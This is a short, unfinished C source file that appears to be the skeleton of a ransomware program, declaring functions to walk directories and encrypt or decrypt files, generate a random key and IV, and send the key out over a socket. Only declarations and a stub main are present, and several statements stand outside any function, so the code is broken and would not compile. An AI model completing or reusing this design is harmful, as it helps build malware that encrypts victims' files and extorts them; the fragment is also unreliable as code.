#include "ransomlib.h"
#include <dirent.h>
// for socket
#include <sys/socket.h>
#include <unistd.h> 
#include <arpa/inet.h>



void usage();

int is_encrypted(char *filename);

void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag);

int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv);


RAND_bytes(key, sizeKey);
RAND_bytes(iv, sizeIv);
bytes_to_hexa(key, pKey, sizeKey);
bytes_to_hexa(iv, pIv, sizeIv);


int send_key(char *pKey, char *pIv);

int main (int argc, char * argv[])
{
	printf("Non\n");
}
